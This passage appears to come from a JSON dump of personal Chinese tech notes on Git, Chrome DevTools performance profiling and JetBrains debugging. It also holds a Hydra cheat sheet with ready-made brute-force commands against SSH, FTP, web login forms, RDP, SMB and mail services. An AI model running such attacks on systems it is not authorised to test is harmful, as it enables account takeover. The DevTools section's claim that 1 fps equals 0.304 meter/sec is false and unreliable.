处，而不会再处于游离状态。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104956.png)\n\n当在新建分支上修改提交完毕时，就切换回 master 分支，将原分支合并到 master 分支就万事大吉了。 到这里就不再操作演示了，大家都懂。\n\n# Git嵌套问题\n## 问题描述\nGit 仓库嵌套使用后，被嵌套的 Git 仓库不能被外层 Git 仓库检测到。\n\n这也就意味着你在被嵌套的 Git 仓库中的更改，外层仓库是无感知的。导致这个问题的原因可能如下：\n\n在代码中引入其他 Git 仓库；\nClone 别人的 Demo 并做修改；\n不看场景的解决方案就是耍流氓。\n\n## 场景一：在代码中引入其他 Git 仓库\n这种情况，需要使用 submodule，过程如下：\n```shell\ngit submodule add https://github.com/chenfengyanyu/fmap-demo.git\n\n# 或者使用 clone\ngit clone --recursive https://github.com/chenfengyanyu/fmap-demo.git\n```\n这个操作类似于 Clone ，但是会在父仓库下面新建 .gitmodules 文件，我们看一下内容：\n```shell\nvi .gitmodules\n```\n大致如下：\n```\n[submodule \"fmap-demo\"]\n        path = fmap-demo\n        url = https://github.com/chenfengyanyu/fmap-demo.git\n```\n然后做正常提交就可以了。\n\n需要注意的是，这样的操作只能提交一个引用，类似：fmap-demo @ 90758cf，打开的话，会跳到项目源地址。\n\n## 场景二：Clone 别人的 Demo 并做修改\n那么有时候，我们可能会 Clone 到一段代码来作为项目的脚手架，这时候嵌套的话，肯定不希望改子仓库的时候，父仓库毫无感知。那么这种情况如何处理呢？\ngithub\n首先，进入子仓库，也就是被嵌套的 Git 仓库，删除 .git 目录：\n```\nrm -rf .git\n```\n可以这么理解，一个项目不应该有俩 Git 地址，所以断开子仓库的原有联系，也就是删除 .git 目录。\n\n然后，将你添加的项目拖出当前项目文件，进行提交。之后，再将项目拖回来，返回项目根目录，执行 add 操作：\n```\ngit add fmap-demo\n```\n这里必须要选择子项目进行 add，此时 add . 和 add * 都无效。\n之后正常 commit 和 push，就可以了。\n\n# 常用命令\n|命令|说明|\n|---|---|\n|`git config --list --show-origin`||\n|`git config -f <file>`||\n|`git config --global user.name \"John Doe\"`||\n|`git config --global user.email johndoe@example.com`||\n|`git config --global core.editor emacs`||\n|`git config --list`||\n|`git config <key>`||\n|`git add -h`||\n|`git hash-object -w new.txt`| 将new.txt生成一个数据对象，并将其写入Git数据库中|\n|`git cat-file -p SHA-1`| 输出数据对象中的内容|\n|`git cat-file -t SHA-1`| 输出数据对象中的类型|\n|`git ls-files -s`|查看暂存区中的内容|\n|`update-index`| 将某个文件放入暂存区中|\n|`write-tree`| 将暂存区中的内容生成一个树对象|\n|`read-tree`| 将树对象读入暂存区中|\n|`git commit-tree 0155eb -p fdf4fc3`| 提交指定的树对象|\n|`find .git/objects -type f`||\n|`git status -s`| 缩短状态命令的输出|\n|`git add`|这是个多功能命令：可以用它开始跟踪新文件，或者把已跟踪的文件放到暂存区，还能用于合并时把有冲突的文件标记为已解决状态等。 将这个命令理解为“精确地将内容添加到下一次提交中”而不是“将一个文件添加到项目中”要更加合适|\n|`git diff`|此命令比较的是工作目录中当前文件和暂存区域快照之间的差异。 也就是修改之后还没有暂存起来的变化内容。|\n|`git diff --staged`或`git diff --cached`| 这条命令将比对已暂存文件与最后一次提交的文件差异|\n|`git commit -m \"Story 182: Fix benchmarks for speed\"`| 提交|\n|`git commit -a`| Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 git add 步骤|\n|`git rm`|连带从工作目录中删除指定的文件，这样以后就不会出现在未跟踪文件清单中了。|\n|`git rm --cached README`| 从暂存区中删除指定文件， 但不将其从本地工作目录中删除|\n|`git mv`||\n|`git commit --amend`||\n|`git reset HEAD CONTRIBUTING.md`||\n|`git checkout -- <file>`||\n|`git remote -v`||\n|`git remote add <shortname> <url>`||\n|`git fetch <remote>`||\n|`git push <remote> <branch>`||\n|`git remote show <remote>`||\n|`git remote rename <name1> <name2>`||\n|`git remote remove <name>`||\n|`git checkout -b <分支名>`||\n|`git branch -d  <分支名>`||\n|`git branch –merged`|查看哪些分支已经合并到当前分支在这个列表中分支名字前没有*号的分支通常可以使用|\n|`git branch --no-merged`|查看所有包含未合并工作的分支|\n|`git merge <分支名>`||\n|`git branch <分支名>`||\n|`git checkout <分支名>`||\n|`git checkout -b <newbranchname>`||\n|`git log --oneline --decorate --graph --all`||\n\n"
  },
  {
    "title": "./notes/软件/Hydra.md",
    "body": "# 简介\nhydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。\n官 网：http://www.thc.org/thc-hydra，可支持AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL , NCP, NNTP, Oracle Listener , Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP等类型密码。\n\n# 安装\nHydra 安装\n```\n# wget --no-check-certificate https://www.thc.org/releases/hydra-8.1.tar.gz\n# tar zxvf hydra-8.1.tar.gz\n# cd hydra-8.1\n# ./configure\n# make && make install\n```\n\n# 参数说明\n```\nhydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]\n[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]\n-R 继续从上一次进度接着破解。\n-S 采用SSL链接。\n-s PORT 可通过这个参数指定非默认端口。\n-l LOGIN 指定破解的用户，对特定用户破解。\n-L FILE 指定用户名字典。\n-p PASS 小写，指定密码破解，少用，一般是采用密码字典。\n-P FILE 大写，指定密码字典。\n-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。\n-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。\n-M FILE 指定目标列表文件一行一条。\n-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。\n-t TASKS 同时运行的线程数，默认为16。\n-w TIME 设置最大超时的时间，单位秒，默认是30s。\n-v / -V 显示详细过程。\nserver 目标ip\nservice 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt\nhttp-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc\nldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec\nrlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere\nteamspeak sip vmauthd firebird ncp afp等等。\n\nOPT 可选项\n```\n# 各种用法实例 ：\n```\n1、破解ssh：\nhydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh\nhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh\n\n2、破解ftp：\nhydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV\nhydra ip ftp -l 用户名 -P 密码字典 -e ns -vV\n\n3、get方式提交，破解web登录：\nhydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/\nhydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php\n\n4、post方式提交，破解web登录：\nhydra -l 用户名 -P 密码字典 -s 80 ip http-post-form \"/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password\"\nhydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form \"login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>\"\n（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中 的内容是表示错误猜解的返回信息提示。）\n\n5、破解https：\nhydra -m /index.php -l muts -P pass.txt 10.36.16.18 https\n\n6、破解teamspeak：\nhydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak\n\n7、破解cisco：\nhydra -P pass.txt 10.36.16.18 cisco\nhydra -m cloud -P pass.txt 10.36.16.18 cisco-enable\n\n8、破解smb：\nhydra -l administrator -P pass.txt 10.36.16.18 smb\n\n9、破解pop3：\nhydra -l muts -P pass.txt my.pop3.mail pop3\n\n10、破解rdp：\nhydra ip rdp -l administrator -P pass.txt -V\n\n11、破解http-proxy：\nhydra -l admin -P pass.txt http-proxy://10.36.16.18\n\n12、破解imap：\nhydra -L user.txt -p secret 10.36.16.18 imap PLAIN\nhydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN\n```\n\n附上windows版本下载地址：\nhttps://github.com/maaaaz/thc-hydra-windows\n\n"
  },
  {
    "title": "./notes/软件/chromeDevtools.md",
    "body": "# Performance面板\n运行时性能表现（runtime performance）指的是当你的页面在浏览器运行时的性能表现，而不是在下载页面的时候的表现。这篇指南将会告诉你怎么用Chrome DevTools Performance功能去分析运行时性能表现。在RAIL性能评估模型下，你可以在这篇指南中可以学到怎么去用这个performance功能去分析Response, Animation, 以及 Idle 这三个性能指标。\n\n在这篇指南中，我们会用Performance工具去分析一个现有的在线DEMO，然后教会你怎么去分析，从而找到性能瓶颈。\n\n打开Chrome的匿名模式。匿名模式可以保证Chrome在一个相对干净的环境下运行。比如说，你安装了许多chrome插件，这些插件可能会影响我们分析性能表现。\n在匿名模式下打开右边这个链接，[DEMO](https://googlechrome.github.io/devtools-samples/jank/)，这个网页就是我们要用来分析的DEMO。这个页面里都是很多上下移动的蓝色小方块。\n按下Command+Opiton+I（Mac）或者Control+shift+I (Windows, Linux) 来打开Devtools\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162656.png)\n\n## 模拟移动设备的CPU\n移动设备的CPU一般比台式机和笔记本弱很多。当你想分析页面的时候，可以用CPU控制器（CPU Throttling）来模拟移动端设备CPU。\n- 在DevTools中，点击 Performance 的 tab。\n- 确保 Screenshots checkbox 被选中\n- 点击 Capture Settings（⚙️）按钮，DevTools会展示很多设置，来模拟各种状况\n- 对于模拟CPU，选择2x slowdown，于是Devtools就开始模拟两倍低速CPU\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162706.png)\n\n## 设置DEMO\n为了使得这个DEMO有相对统一的运行表现（不同的读者，机器的性能千差万别）。这个DEMO提供了自定义功能，用来确保这个DEMO的统一表现。\n- 一直点击 Add 10 这个按钮直到你能很明显看到蓝色小方块移动变慢，在性能比较好的机器上，大概要点击20次左右。\n- 点击 Optimize按钮，你会发现蓝色小方块会变的很快而且动画变得平滑。\n- 点击 un-optimize 按钮，蓝色小方块又会变成之前的模样。\n\n## 性能分析操作流程\n1. 在谷歌浏览器调式模式下，切换到 performance 选项卡。点击刷新图标（或者Ctrl+Shift+E快捷键）。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162715.png)\n\n2. 出现如下网页分析进度条。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162724.png)\n\n3. 自动停止后，会出现性能分析图。\n\n**注意点1**：需要勾选屏幕快照选项，才会出现如下屏幕快照截图（一般是默认勾选）。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162734.png)\n\n**注意点2**：整个分析图出现的时间轴就是前面步骤中分析进度条的时间，而默认出现的区域时间轴是首屏加载时间。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162744.png)\n\n如图所示：\n（1）以上红色框出的部分（也是整个时间轴）就是前面分析进度条的分析时间。\n（2）以上绿色框出的部分是首屏加载时间。\n（3）首屏加载时间刻度与选项卡 Summary 的 Total 总时间一致。\n（4）如下图可通过左右边界来调整时间轴区域。时间轴区域 2 是 时间轴区域 1 的放大版，便于查看时间轴区间的各项指标性能情况。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162754.png)\n\n## 性能分析图详解\n如下所示，把整张分析图划分成 3 个区域。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162806.png)\n\n### 区域1：网页性能总览图\n总览图包含 FPS（每秒帧数情况）、CPU（CPU占用情况）、NET（网络资源情况）、HEAP（JS占用情况）一共四项指标。\n\n**FPS**：全称 Frames Per Second，表示每秒传输帧数，是速度单位，用来分析动画的一个主要性能指标。1fps = 0.304 meter/sec(米/秒)。如下图所示，绿色竖线越高，FPS 越高。 红色表示长时间帧，可能出现卡顿。\n\n如果能够达到 >=60fps(帧)/s 的刷新频率，就可以避免出现卡顿。\n尽量保证页面要有高于每秒60fps(帧)的刷新频率，这与大多数显示器的刷新率相吻合(60Hz)。如果网页动画能够做到每秒60帧，就会跟显示器同步刷新，达到最佳的视觉效果。\n\n这意味着，一秒之内进行 60 次重新渲染，每次重新渲染的时间不能超过1/60=0.01666s（秒）；`0.01666s*1000=16.66ms（毫秒）`。\n\n不同帧的体验：\n帧率能够达到 50 ～ 60 FPS 的动画将会相当流畅，让人倍感舒适；\n帧率在 30 ～ 50 FPS 之间的动画，因各人敏感程度不同，舒适度因人而异；\n帧率在 30 FPS 以下的动画，让人感觉到明显的卡顿和不适感；\n帧率波动很大的动画，亦会使人感觉到卡顿。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162832.png)\n\n**CPU**：CPU 资源。此面积图指示消耗 CPU 资源的事件类型。\n下图中颜色分别为（与数据统计中的颜色数据表示一致）：\n蓝色(Loading)：表示网络通信和 HTML 解析时间。\n黄色(Scripting)：表示 JavaScript 执行时间。\n紫色(Rendering)：表示样式计算和布局（重排）时间。\n绿色(Painting)：表示重绘时间。\n灰色(other)：表示其它事件花费的时间。\n白色(Idle)：表示空闲时间。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162842.png)\n\n**NET**：每条彩色横杠表示一种资源。横杠越长，检索资源所需的时间越长。 每个横杠的浅色部分表示等待时间（从请求资源到第一个字节下载完成的时间）。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162850.png)\n\n**HEAP**：JavaScrip 执行的时间分布。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162859.png)\n\n\n### 区域2：各项指标的区块图\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162910.png)\n\n- `Network`：表示每个服务器资源的加载情况。\n- `Frames`：表示每幅帧的运行情况。\n- `Timings`：上图中有 4 条虚线，分别表示如下。\n  - DCL（DOMContentLoaded）表示 HTML 文档加载完成事件。当初始 HTML 文档完全加载并解析之后触发，无需等待样式、图片、子 frame 结束。作为明显的对比，load 事件是当个页面完全被加载时才触发。\n  - FP（First Paint）首屏绘制，页面刚开始渲染的时间。\n  - FCP（First Contentful Paint）首屏内容绘制，首次绘制任何文本，图像，非空白canvas 或 SVG 的时间点。\n  - FMP（First Meaningful Paint）首屏有意义的内容绘制，这个“有意义”没有权威的规定，本质上是通过一种算法来猜测某个时间点可能是 FMP。有的理解为是最大元素绘制的时间，即同LCP（Largest Contentful Paint ）。 其中 FP、FCP、FMP 是同一条虚线，三者时间不一致。比如首次渲染过后，有可能出现 JS 阻塞，这种情况下 FCP 就会大于 FP。\n  - L（Onload）页面所有资源加载完成事件。\n  - LCP（Largest Contentful Paint ）最大内容绘制，页面上尺寸最大的元素绘制时间。\n\n- `Main`：表示主线程。\n  - 主线线程主要负责：\n  - Javascript 的计算与执行；\n  - CSS 样式计算；\n  - Layout 布局计算；\n  - 将页面元素绘制成位图（paint），也就是光栅化（Raster）；\n  - 将位图给合成线程。\n\n- `Raster`：光栅化（处理光栅图，即位图）。\n- `GPU`：表示 GPU 占用情况。\n- `Chrome_childIOThread`：子线程。\n- `Compositor`：合成线程。\n  - 合成线程主要负责：\n  - 将位图（GraphicsLayer 层）以纹理（texture）的形式上传给 GPU；\n  - 计算页面的可见部分和即将可见部分（滚动）；\n  - CSS 动画处理；\n  - 通知 GPU 绘制位图到屏幕上。\n\n- `JS Heap`：表示 JS 占用的内存大小。\n- `Documents`：表示文档数。\n- `Nodes`：表示 Node 节点数。\n- `Listeners`：表示监听数。\n- `GPU Memory`：表示 GPU 占用数。\n下面的 4 条折线图是以上 4 个指标（没有 GPU 消耗）对应的时间消耗的内存大小与节点数量。若将某项指标前面的勾选去掉则不会出现对应的折线。\n注意这个折线图只有在点击 Main 主线程的时候才会有，选择其他的指标时折线图区域时空白。\n\n## 区域3：数据统计与汇总\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162919.png)\n\n- Summary：表示各指标时间占用统计报表；\n- Bottom-Up：表示事件时长排序列表（倒序）；\n- Call tree：表示事件调用顺序列表；\n- Event Log：表示事件发生的顺序列表；\n\n**Loading 事件：**\n| 内容             | 说明                                                                   |\n| ---------------- | ---------------------------------------------------------------------- |\n| Parse HTML       | 浏览器解析 HTML                                                        |\n| Finish Loading   | 网络请求完成                                                           |\n| Receive Data     | 请求的响应数据到达事件，如果响应数据很大（拆包），可能会多次触发该事件 |\n| Receive Response | 响应头报文到达时触发                                                   |\n| Send Request     | 发送网络请求时触发                                                     |\n\n**Scripting 事件：**\n| 内容                    | 说明                                                 |\n| ----------------------- | ---------------------------------------------------- |\n| Animation Frame Fired   | 一个定义好的动画帧发生并开始回调处理时触发           |\n| Cancel Animation Frame  | 取消一个动画帧时触发                                 |\n| GC Event                | 垃圾回收时触发                                       |\n| DOMContentLoaded        | 当页面中的DOM内容加载并解析完毕时触发                |\n| Evaluate Script         | A script was evaluated.                              |\n| Event                   | JS 事件                                              |\n| Function Call           | 浏览器进入 JS 引擎时触发                             |\n| Install Timer           | 创建计时器（调用setTimeout()和setInterval()）时触发  |\n| Request Animation Frame | A requestAnimationFrame() call scheduled a new frame |\n| Remove Timer            | 清除计时器触发                                       |\n| Time                    | 调用 console.time() 触发                             |\n| Time End                | 调用 console.timeEnd() 触发                          |\n| Timer Fired             | 定时器激活回调后触发                                 |\n| XHR Ready State Change  | 当一个异步请求为就绪状态后触发                       |\n| XHR Load                | 当一个异步请求完成加载后触发                         |\n\n**Rendering 事件：**\n| 内容              | 说明                              |\n| ----------------- | --------------------------------- |\n| Invalidate layout | 当 DOM 更改导致页面布局失效时触发 |\n| Layout            | 页面布局计算执行时触发            |\n| Recalculate style | Chrome 重新计算元素样式时触发     |\n| Scroll            | 内嵌的视窗滚动时触发              |\n\n**Painting事件：**\n| 内容             | 说明                                  |\n| ---------------- | ------------------------------------- |\n| Composite Layers | Chrome 的渲染引擎完成图片层合并时触发 |\n| Image Decode     | 一个图片资源完成解码后触发            |\n| Image Resize     | 一个图片被修改尺寸后触发              |\n| Paint            | 合并后的层被绘制到对应显示区域后触发  |\n\n## 分析报告\n一旦你得到了页面的性能表现报告，那么就可以用它来分析页面的性能，从而找到性能瓶颈。\n\n### 分析每一秒的帧\nFPS（frames per second）是用来分析动画的一个主要性能指标。能保持在60的FPS的话，那么用户体验就是不错的。\n- 观察FPS图表，如果你发现了一个红色的长条，那么就说明这些帧存在严重问题，有可能导致非常差的用户体验。一般来说，绿色的长条越高，说明FPS越高，用户体验越好。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162928.png)\n\n- 就在FPS图表下方，你会看到CPU图表。在CPU图表中的各种颜色与Summary面板里的颜色是相互对应的，Summary面板就在Performance面板的下方。CPU图表中的各种颜色代表着在这个时间段内，CPU在各种处理上所花费的时间。如果你看到了某个处理占用了大量的时间，那么这可能就是一个可以找到性能瓶颈的线索。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162937.png)\n\n- 把鼠标移动到FPS，CPU或者NET图表之上，DevToos就会展示这个时间点界面的截图。左右移动鼠标，可以重发当时的屏幕录像。这被称为scrubbing, 他可以用来分析动画的各个细节。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162946.png)\n\n- 在Frames图表中，把鼠标移动到绿色条状图上，Devtools会展示这个帧的FPS。每个帧可能都在60以下，都没有达到60的标准。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409162956.png)\n\n当然这个对于DEMO，可以相当容易观察到性能的问题。但是在现实使用场景下，就不是那么容易观察到了。所以要把常常使用这些工具来分析页面。\n\n小功能：显示实时FPS面板\n另外一个好用的小工具就是实时FPS面板，它可以实时展示页面的FPS指标\n按下 Command+Shift+P（Mac）或者 Control+Shift+P(Windows, Linux) 打开命令菜单\n输入Rendering，点选Show Rendering\n在Rendering面板里，激活FPS Meter。FPS实时面板就出现在页面的右上方。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163006.png)\n\n### 定位瓶颈\n现在已经确定到这个页面的动画性能表现不太好，那么下一步就是找到为什么\n- 注意Summary面板，你会发现CPU花费了大量的时间在rendering上。因为提高性能就是一门做减法的艺术，你的目标就是减少rendering的时间\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163015.png)\n\n- 展开Main图表，Devtools展示了主线程运行状况。X轴代表着时间。每个长条代表着一个event。长条越长就代表这个event花费的时间越长。Y轴代表了调用栈（call stack）。在栈里，上面的event调用了下面的event。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163025.png)\n\n- 在性能报告中，有很多的数据。可以通过双击，拖动等等动作来放大缩小报告范围，从各种时间段来观察分析报告。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163034.png)\n\n- 在事件长条的右上角出，如果出现了红色小三角，说明这个事件是存在问题的，需要特别注意。\n- 双击这个带有红色小三角的的事件。在Summary面板会看到详细信息。注意reveal这个链接，双击它会让高亮触发这个事件的event。如果点击了app.js:94这个链接，就会跳转到对应的代码处。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163045.png)\n\n- 在app.update这个事件的长条下方，有很多被触发的紫色长条。如果放大这些事件长条，你会看到它们每个都带有红色小三角。点击其中一个紫色事件长条，Devtools在Summary面板里展示了更多关于这个事件的信息。确实，这里有很多reflow的警告。\n- 在summary面板里点击app.js:70链接，Devtools会跳转到需要优化的代码处\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163056.png)\n\nOK！Devtools里面还有很多很多指标需要你去探索，但是，对于怎么用Devtools去分析网页的运行时性能表现，你现在已经有了一个基本的概念。\n\n\n\n\n\n\n\n\n"
  },
  {
    "title": "./notes/软件/axure.md",
    "body": ""
  },
  {
    "title": "./notes/软件/jetbrains.md",
    "body": "# 编辑器快捷键\n## 光标跳转快捷键\n\n| 功能                                       | Jetbrain |\n| ------------------------------------------ | -------- |\n| Back                                       | ctrl+o       |\n| Forward                                    |  ctrl+i      |\n| find usage                                 | gR       |\n| show usage                                 | gr       |\n| 跳转到声明处                               | gd       |\n| 跳转到上一个方法Previousmethod             | gk       |\n| 跳转到下一个方法Nextmethod                 | gj       |\n| 上一个错误或警告                           | g[       |\n| 下一个错误或警告                           | g]       |\n| 跳转到方法的实现                           | gi       |\n| 跳转到父类方法处go to super method         | gs       |\n| JumpToLastChange                           | g,       |\n| 全局查找                                   | gF或ctrl-shift-f       |\n| 翻半页(保留vim操作)                        | ctrl+u/d |\n\n## 提示/查找快捷键\n\n| 功能                               | Jetbrain  |\n| -----------------------------      | --------- |\n| 显示方法参数信息                   | control+a    |\n| quick Documentation                | control+k |\n| external Documentation             | control+shift+k |\n| 错误/警告描述ErrorDescription      | control+e     |\n| show context actions               | control+f |\n\n## 编辑快捷键\n\n| 功能                              | Jetbrain   |\n| --------------------------------- | ---------- |\n| Generate                          | control+g     |\n| 重命名                            | control+r     |\n| 快速生成函数注释(Fix doc comment) | control+c     |\n| Surround with                     | control+s     |\n| 快速导包                          | control+m     |\n| 折叠/展开全部                          | zao/zac     |\n\n## 有关窗口的快捷键\n\n| 功能                     | Jetbrain     |\n| ------------------------ | ------------ |\n| 显示/关闭资源目录窗口    | control+p        |\n| 显示/关闭其他非编辑窗口  | control+n        |\n\n---\n\n# IDEA篇\n## IntelliJ IDEA的调试功能\n[官网](https://www.jetbrains.com/help/idea/debugging-code.html)\n\n### debug面板按钮详解\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327142719.png)\n\n- `show execution point`: 如果你的光标在其他行或其他页面，点击这个按钮可跳转到当前代码执行的行\n- `step over`: 一行一行地往下走，如果这一行有方法不会进入方法\n- `step into`: 如果当前有方法，可以进入方法内部，一般用于进入自定义方法内部，不会进入官方类库的方法\n- `force step into`: 强制进入任何方法内部\n- `step out`: 从`step into`进入的方法内退出到方法调用处\n- `run to cursor`: 运行到光标处 \n- `Resume program`: 会从该断点处继续运行，直到下一个断点处\n- `Pause program`: 暂停运行 \n\n\n\n### 断点\n#### 断点类型\nIDEA支持以下几种断点类型：\n- 行断点（Line Breakpoints）：遇断点所在的行即停\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143139.png)\n\n- 方法断点（Method Breakpoints）：如果你看到代码调用了一个接口中的抽象方法，但不知道具体会跑在哪个实现上，便可以在该接口上的抽象方法上设置断点，这样不管哪个子类运行到这个方法都会停下来。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143156.png)\n\n- 异常断点（Exception Breakpoints）：可以在Run -> View Breakpoints中的Java Exception Breakpoints里添加异常的具体类型。这样的话，程序中一旦发生了这种异常马上就会停下来。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143214.png)\n\n- 字段断点（Field Watchpoints）：可以设置在字段上，这样读写字段都可以触发。需要注意的是，默认只有写才会停下，想要让读取时也停下，需要右击断点，在Watch的Field access上打勾才行。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143233.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143247.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143302.png)\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/a_AXz-DoGzM\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n#### 条件断点\n断点是可以设置条件的，这样便可以只在关心的时候停下来。比如说循环里处理一堆字符串，但是只关心特定的字符串，那条件断点便可以派上用场。按住Shift键设置断点，或是右击断点之后选择More来打开以下界面：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143517.png)\n\n上图就是设置条件断点的界面，直接在Condition里输入条件即可，如\"ggg\".equals(name)。需要注意的是，**Suspend默认是没有打勾的，必须勾选上才能让程序暂停**。另外，辛辛苦苦设置的特定断点，是可以拖拽到别的地方去的，这样就省的到处敲来敲去的了。还有一个小技巧是按住Alt的同时设置断点，可以让断点仅停一次便自动消失。在设置临时断点时有点用。\n\n#### 无断点暂停\n如果在很长的循环时不知道程序运行到哪里了，可以在调试时点击调试窗口上的**Pause Program**，这样程序便能在当前执行的地方暂停。另外，**运行到光标（Run to cursor）**也可以在没有设置断点的时候让程序运行到光标所在行时暂停。\n\n### 调试技巧\n#### 智能进入（Smart step into）\n当调试程序运行到类似这样的句子时，如果你想看的是actor.action方法，那么进入这个方法就相对麻烦一些。\n```java\nactor.action(actionProvider.provide(action.getName()));\n```\n这时可以使用调试窗口上的智能进入，程序会弹出一个对话框，我们选择需要的调用处即可。算是一个提升调试效率的小技巧。\n官方文档传送门：https://www.jetbrains.com/help/idea/stepping-through-the-program.html#smart-step-into\n\n#### 表达式评估（Evaluate expression）\n这应该是大部分人都知道的技巧了，可以通过表达式评估来重新赋值当前的变量，以便让程序运行到其它的分支去。当然也可以在Variables窗口中，右击想要改变的变量，选择Set Value。不过表达式评估里可以轻松增加新变量、动态import新类库等，功能更加强大。\n官方文档传送门：https://www.jetbrains.com/help/idea/examining-suspended-program.html#evaluating-expressions\n\n#### 弃栈帧（Drop frame）\nVisual Studio好的一点是调试时可以拖拽当前执行的位置，方便反复查看。虽然IDEA没有这样的功能，但是它可以使用弃栈帧来把当前调用栈的第一栈帧丢弃掉，相当于重新开始当前调试的方法。使用方法也算简单，在要丢弃的栈帧上右击，选择Drop Frame即可。或者直接单击调试窗口的Drop Frame按钮。不过需要注意的是，如果对象在子方法运行时发生了变化，是不会再变回去的。\n官方文档传送门：https://www.jetbrains.com/help/idea/stepping-through-the-program.html#drop-frame\n\n#### 强制抛异常（Throw an exception）\n这是IDEA 2018年加入的新功能，可以直接在调试中抛出指定的异常。使用方法跟上面的弃栈帧类似，右击栈帧并选择Throw Exception，然后输入如下代码即可：\n```java\nthrow new NullPointerException()\n```\n官方文档传送门：https://www.jetbrains.com/help/idea/altering-the-program-s-execution-flow.html#throw_exception\n\n#### 强制返回（Force return）\n这是IDEA2015版时增加的功能，类似上面的手动抛异常，只不过是返回一个指定值罢了。使用方法跟上面也都类似，右击栈帧并选择Force Return，然后输入要返回的值即可。如果是void的方法那就更简单了，连返回值都不用输。\n官方文档传送门：https://www.jetbrains.com/help/idea/altering-the-program-s-execution-flow.html#force_return\n\n#### 自动载入变化代码（Reload changes）\n利用Java虚拟机提供的HotSwap功能，我们可以做到一边调试一边改代码。只要在修改完代码之后，点击Run -> Reload Changed Classes即可。不过HotSwap有一些限制，例如不支持static的字段和方法等。\n官方文档传送门：https://www.jetbrains.com/help/idea/altering-the-program-s-execution-flow.html#reload_classes\n\n#### 显示方法返回值（Show method return values）\n调试窗口里的Settings -> Show Method Return Values开关可以显示方法的返回值。例如以下方法：\n```java\nprivate double random() {\n    return Math.random();\n}\n```\n只要在return上设断点然后Step Over，或者在方法内部的任何地方设断点然后Step Out一下，便可以在调用处的变量窗口看到一个类似于这样的值：Test.random() = 0.28735657504865864。在这个方法调用没有赋值给变量时（如if (random() < 10)）还挺有用的。\n\n#### 调试流（Trace Current Stream Chain）\n前面说了Visual 